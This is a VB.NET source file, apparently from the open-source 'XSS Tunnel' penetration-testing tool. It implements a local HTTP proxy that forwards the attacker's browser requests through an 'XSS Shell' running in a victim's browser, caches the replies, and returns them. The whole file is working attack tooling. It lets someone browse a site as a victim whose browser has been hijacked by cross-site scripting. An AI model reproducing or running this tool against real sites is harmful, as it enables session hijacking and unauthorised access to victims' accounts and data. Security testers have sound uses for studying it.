#Region "GPL License"

'This file is part of XSS Tunnel.
'
'XSS Tunnel, XSS Tunneling tool 
'Copyright (C) 2007 Ferruh Mavituna

'This program is free software; you can redistribute it and/or
'modify it under the terms of the GNU General Public License
'as published by the Free Software Foundation; either version 2
'of the License, or (at your option) any later version.

'This program is distributed in the hope that it will be useful,
'but WITHOUT ANY WARRANTY; without even the implied warranty of
'MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
'GNU General Public License for more details.

'You should have received a copy of the GNU General Public License
'along with this program; if not, write to the Free Software
'Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#End Region

Imports System.Net.Sockets
Imports System.Net
Imports System.IO


''' <summary>
''' Proxy Implementation for XSS Tunnel
''' </summary>
''' <remarks>
''' Get requests from client tunnel them to supplied XSSShell and reply browser
''' Doesn't support KeepAlive Proxy Connections 
'''
''' 21.06.2007
''' - Now Cache folder in temp folder to avoid potential permission problems
''' - Clear Cache added
''' - Stupid bind bug fixed caused by a mispelled variable name!
''' </remarks>
Public Class Proxy


#Region "Events"

    ''' <summary>
    ''' Resource Requested
    ''' </summary>
    ''' <param name="path"></param>
    ''' <remarks></remarks>
    Public Event Requested(ByVal path As String)

    ''' <summary>
    ''' Response Received from XSS Shell (victim's client)
    ''' </summary>
    ''' <param name="response"></param>
    ''' <remarks></remarks>
    Public Event ResponseReceived(ByVal response As ReadableResponse)


    ''' <summary>
    ''' Debug message sent
    ''' </summary>
    ''' <param name="message"></param>
    ''' <param name="sender"></param>
    ''' <remarks></remarks>
    Public Event DebugMessageSent(ByVal message As String, ByVal sender As Object)

#End Region

#Region "Constants"

    ''' <summary>
    ''' Default Read Buffer Size
    ''' </summary>
    ''' <remarks></remarks>
    Public Const DefaultBufferSize As Integer = 4096

    ''' <summary>
    ''' Default Buffer Increase Multiplier
    ''' </summary>
    ''' <remarks></remarks>
    Public Const DefaultIncreaseMultiplier As Integer = 3


    ''' <summary>
    ''' Is Keep Alive supported by client (normally should be extracted from HTTP Headers)
    ''' </summary>
    ''' <remarks></remarks>
    Public Const KeepAlive As Boolean = False

    ''' <summary>
    ''' Keep Alive Supported by Proxy
    ''' </summary>
    ''' <remarks></remarks>
    Public Const KeepAliveSupported As Boolean = False



#End Region

#Region "Constructor"

    ''' <summary>
    ''' New Proxy
    ''' </summary>
    ''' <param name="XSSShell"></param>
    ''' <remarks></remarks>
    Public Sub New(ByVal XSSShell As XSSShell)
        Me.XSSSHell = XSSShell
    End Sub

    ''' <summary>
    ''' New Proxy 
    ''' </summary>
    ''' <param name="XSSShell"></param>
    ''' <param name="port"></param>
    ''' <param name="IPAddress"></param>
    ''' <remarks></remarks>
    Public Sub New(ByVal XSSShell As XSSShell, ByVal port As Integer, ByVal IPAddress As IPAddress)
        Me.XSSSHell = XSSShell
        Me.Port = port
        Me.IPAddress = IPAddress
    End Sub

#End Region

#Region "Properties"

    Private _Cached As Integer

    ''' <summary>
    ''' Cached Requests
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public ReadOnly Property CachedRequests() As Integer
        Get
            Return _Cached
        End Get
    End Property

    Private _Requests As Integer

    ''' <summary>
    ''' Requests 
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public ReadOnly Property Requests() As Integer
        Get
            Return _Requests
        End Get
    End Property

    Private _Responses As Integer

    ''' <summary>
    ''' Responses 
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public ReadOnly Property Responses() As Integer
        Get
            Return _Responses
        End Get
    End Property


    Public _Port As Integer
    ''' <summary>
    ''' Port to Bind
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks>Default : 8080</remarks>
    Private Property Port() As Integer
        Get
            If _Port = 0 Then _Port = 65000
            Return _Port
        End Get
        Set(ByVal value As Integer)
            'TODO : Restart server when change
            _Port = value
        End Set
    End Property


    Private _XSSShell As XSSShell
    ''' <summary>
    ''' Related XSS Shell to tunnel data
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Property XSSSHell() As XSSShell
        Get
            Return _XSSShell
        End Get
        Set(ByVal value As XSSShell)
            _XSSShell = value
        End Set
    End Property



    Dim _RequestListener As TcpListener

    ''' <summary>
    ''' Request Listener
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private ReadOnly Property RequestListener() As TcpListener
        Get
            Try

                If _RequestListener Is Nothing Then _RequestListener = New TcpListener(Me.IPAddress, Port)
            Catch ex As Exception
                WriteConsole("!Error proxy couldn't start to listen : " & ex.ToString)

            End Try

            'Dns.Resolve(Dns.GetHostName()).AddressList(0)

            Return _RequestListener
        End Get
    End Property


    Private _IPAddress As IPAddress
    ''' <summary>
    ''' IP Address to bind
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property IPAddress() As IPAddress
        Get
            If _IPAddress Is Nothing Then IPAddress = IPAddress.Any
            Return _IPAddress
        End Get
        Set(ByVal value As IPAddress)
            _IPAddress = value
        End Set
    End Property

    Private _ProxyMode As Boolean
    ''' <summary>
    ''' Act as a proper proxy, do not use XSSSHell 
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Property ProxyMode() As Boolean
        Get
            Return _ProxyMode
        End Get
        Set(ByVal value As Boolean)
            _ProxyMode = value
        End Set
    End Property

    Private _CacheEnabled As Boolean
    ''' <summary>
    ''' Enable caching
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Property CacheEnabled() As Boolean
        Get
            Return _CacheEnabled
        End Get
        Set(ByVal value As Boolean)
            _CacheEnabled = value
        End Set
    End Property



#End Region

#Region "Core"

    ''' <summary>
    ''' Start Listen for incoming Connections
    ''' </summary>
    ''' <remarks></remarks>
    Public Sub Listen()

        Try
            RequestListener.Start()

        Catch ex As Exception
            WriteConsole("!Proxy start error : " & ex.ToString)
            Exit Sub

        End Try

        WriteConsole("Started to Listen : " & Me.IPAddress.ToString & ":" & Port)

        While True

            Try

                Dim Client As TcpClient = RequestListener.AcceptTcpClient()
                Dim ClientIP As IPEndPoint = CType(Client.Client.RemoteEndPoint, IPEndPoint)

                Console.WriteLine(ClientIP.Address.ToString() & ":" & ClientIP.Port.ToString() & " Connected...")

                Try
                    Dim Thr As Threading.Thread
                    'If ProxyMode Then
                    '    Thr = New Threading.Thread(AddressOf ProcessRequest)

                    'Else
                    Thr = New Threading.Thread(AddressOf Me.ProcessTunnelledRequest)

                    'End If


                    Thr.Start(Client)

                Catch ex As Exception
                    WriteConsole("Thread Failed : " & ex.ToString)

                End Try

            Catch ex As Net.Sockets.SocketException
                WriteConsole("Stopped to listen!")
                Exit Sub

            End Try


        End While

    End Sub


    ''' <summary>
    ''' Raise Debug/Console Messages
    ''' </summary>
    ''' <param name="message"></param>
    ''' <remarks></remarks>
    Private Sub WriteConsole(ByVal message As String)
        Debug.WriteLine(message)
        RaiseEvent DebugMessageSent(message, Me)
    End Sub


    ''' <summary>
    ''' Stop Listening
    ''' </summary>
    ''' <remarks></remarks>
    Public Sub [Stop]()
        RequestListener.Stop()
    End Sub


    ''' <summary>
    ''' Read Request from TCPClient, fill buffer
    ''' </summary>
    ''' <param name="client"></param>
    ''' <param name="requestBuffer"></param>
    ''' <returns>Read byte, -1 if it fails</returns>
    ''' <remarks></remarks>
    Private Function ReadRequest(ByVal client As TcpClient, ByRef requestBuffer As Byte()) As Integer
        Dim ReadData As Integer
        Dim RequestReadOffset As Integer

        Try
            Do
                'If there is no space in request buffer increase buffer (should be a huge one!)
                If requestBuffer.Length < RequestReadOffset + client.ReceiveBufferSize Then
                    Array.Resize(Of Byte)(requestBuffer, requestBuffer.Length * DefaultIncreaseMultiplier)
                    WriteConsole("Array Resized")
                End If

                ReadData = client.GetStream.Read(requestBuffer, RequestReadOffset, client.ReceiveBufferSize)
                RequestReadOffset += ReadData

                If ReadData < 1 Then Exit Do
            Loop While Text.Encoding.ASCII.GetString(requestBuffer, 0, RequestReadOffset).IndexOf(vbNewLine & vbNewLine) = -1

        Catch ex As Exception
            WriteConsole("Client TCP closed etc. Error")
            Return -1

        End Try

        Return RequestReadOffset
    End Function


    '''' <summary>
    '''' Write buffer
    '''' </summary>
    '''' <param name="buffer"></param>
    '''' <remarks></remarks>
    'Private Shared Sub DebugBuffer(ByVal buffer() As Byte, ByVal title As String)
    '    Debug.WriteLine("------" & title & "------")
    '    Debug.WriteLine(System.Text.Encoding.ASCII.GetString(buffer).Trim())
    '    Debug.WriteLine("------------")
    'End Sub

    Dim ErrorPage As String = "HTTP/1.1 200 OK" & vbNewLine & "Server: XSS Shell Proxy" & vbNewLine & "Content-Type: text/html" & vbNewLine & vbNewLine & "<html><head><title>Denied by XSS Shell Proxy</title></head><body><div style=""text-align:center"">This request is not supported by <em>XSS Shell Proxy</em></div></body></html>"


#End Region

#Region "XSS Tunnel"
    ''' <summary>
    ''' Get Cache Directory
    ''' </summary>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Shared Function GetCacheDirectory() As String
        'Dim CacheDir As String = IO.Path.Combine(My.Application.Info.DirectoryPath, "cache")
        Dim CacheDir As String = IO.Path.Combine(IO.Path.GetTempPath(), "XSSTunnel-Cache")

        If Not Directory.Exists(CacheDir) Then
            Directory.CreateDirectory(CacheDir)
        End If

        Return CacheDir
    End Function

    ''' <summary>
    ''' Clear files in the cache folder
    ''' </summary>
    ''' <remarks></remarks>
    Public Shared Sub ClearCache()
        Dim CacheFolder As String = GetCacheDirectory()
        IO.Directory.Delete(CacheFolder, True)
    End Sub


    ''' <summary>
    ''' Get file from local cache
    ''' </summary>
    ''' <param name="path"></param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function GetFromCache(ByVal path As String) As Byte()

        If Not Me.CacheEnabled OrElse Not Cachable(path) Then Return Nothing

        Dim SaveFileName As String = GetCacheFileName(path)
        If File.Exists(SaveFileName) Then
            Return File.ReadAllBytes(SaveFileName)
        End If

        Return Nothing
    End Function

    ''' <summary>
    ''' Get path's cache file name
    ''' </summary>
    ''' <param name="path"></param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Shared Function GetCacheFileName(ByVal path As String) As String
        Dim CacheDir As String = GetCacheDirectory()
        Dim SaveFileName As String = GetValidFileName(path)
        Return IO.Path.Combine(CacheDir, SaveFileName)
    End Function


    ''' <summary>
    ''' Is response / request cachable ?
    ''' </summary>
    ''' <param name="path"></param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function Cachable(ByVal path As String) As Boolean

        Try

            Select Case IO.Path.GetExtension(path)
                Case ".gif", ".jpg", ".js", ".css"
                    Return True
            End Select
        Catch ex As Exception
            WriteConsole("Unexpected path")

        End Try

        Return False
    End Function

    ''' <summary>
    ''' Cache Response
    ''' </summary>
    ''' <param name="path"></param>
    ''' <remarks></remarks>
    Private Sub CacheResponse(ByVal path As String, ByVal content As Byte())
        If Not Cachable(path) Then Exit Sub

        Dim SaveFileName As String = GetCacheFileName(path)
        Try
            File.WriteAllBytes(SaveFileName, content)

        Catch ex As Exception
            WriteConsole("Cache write err!")

        End Try




    End Sub


    ''' <summary>
    ''' Get valid file name
    ''' </summary>
    ''' <param name="path"></param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Shared Function GetValidFileName(ByVal path As String) As String

        Dim FileName As String = path.Replace("/", "-").Replace("\", "-")
        For Each Chr As Char In IO.Path.GetInvalidPathChars
            FileName = FileName.Replace(Chr, String.Empty)
        Next

        Return FileName
    End Function



    ''' <summary>
    ''' Process Tunneled Request
    ''' </summary>
    ''' <param name="tcpClient"></param>
    ''' <remarks></remarks>
    Private Sub ProcessTunnelledRequest(ByVal tcpClient As Object)

        Dim Browser As TcpClient = DirectCast(tcpClient, TcpClient)
        Browser.ReceiveBufferSize = DefaultBufferSize

        While True
            Dim requestBuffer(Browser.ReceiveBufferSize * DefaultIncreaseMultiplier) As Byte

            Dim ReadData As Integer
            ReadData = ReadRequest(Browser, requestBuffer)

            'Err
            If ReadData = -1 Then
                Exit While
            End If

            'Console.WriteLine(Text.Encoding.ASCII.GetString(requestBuffer, 0, ReadData))

            Dim HttpReq As New HttpParser(requestBuffer, ReadData)

            'Check SSL Connections
            If HttpReq.Method = HttpParser.HTTPMethod.CONNECT Then
                WriteConsole("SSL connections not supported !")
                Browser.GetStream.Close()
                Browser.Close()
                Exit Sub
            End If


            If HttpReq.Url Is Nothing Then
                WriteConsole("Target host couldn't identified")
                Exit Sub
            End If


            Dim PostData As String = Nothing
            If HttpReq.Method = HttpParser.HTTPMethod.POST Then
                PostData = HttpReq.RequestBody
            End If



            'Send and Wait for Response
            RaiseEvent Requested(HttpReq.Url.PathAndQuery)
            Threading.Interlocked.Increment(_Requests)
            '            Console.WriteLine("Requesting : " & HttpReq.Url.PathAndQuery)

            Dim HTTPResponse As HttpResponse
            Dim CachedResponse() As Byte = GetFromCache(HttpReq.Url.PathAndQuery)
            If CachedResponse Is Nothing Then
                HTTPResponse = XSSSHell.SendGetUriCommand(HttpReq.Url.PathAndQuery, PostData)

                'Add it to cache
                If Not HTTPResponse Is Nothing Then CacheResponse(HttpReq.Url.PathAndQuery, HTTPResponse.Body)
                Threading.Interlocked.Increment(_Responses)

            Else ' Get from cache
                HTTPResponse = New HttpResponse()
                HTTPResponse.Status = 200
                HTTPResponse.StatusText = "OK"
                HTTPResponse.Body = CachedResponse
                HTTPResponse.AddHeader("Via-Cache", "XSS Tunnel")

                'Console.WriteLine("Answer from Cache: " & HttpReq.Url.PathAndQuery)
                HTTPResponse.Cached = True
                Threading.Interlocked.Increment(_Cached)

            End If



            'If there is a response otherwise, don't response so client will timeout (better than finishing with 200 OK)
            If Not HTTPResponse Is Nothing Then

                'Response
                RaiseEvent ResponseReceived(New ReadableResponse(HttpReq.Url.PathAndQuery, HTTPResponse.Status, HTTPResponse.Cached))

                Dim ResponseBuffer() As Byte = HTTPResponse.GetServerResponse

                'Write to client
                If Browser.Connected AndAlso Browser.GetStream.CanWrite Then
                    Try
                        Browser.GetStream.Write(ResponseBuffer, 0, ResponseBuffer.Length)

                    Catch ex As IO.IOException
                        WriteConsole("Write to browser, Error")

                    End Try

                Else
                    WriteConsole("Err & Cancelled!")

                End If

            End If

            If Not KeepAlive Then Exit While
        End While

        Try

            If Browser.Connected Then
                Browser.GetStream.Close()
                Browser.Close()
            End If

        Catch ex As Exception
            WriteConsole("Something stupid happened...")

        End Try

    End Sub

#End Region

End Class
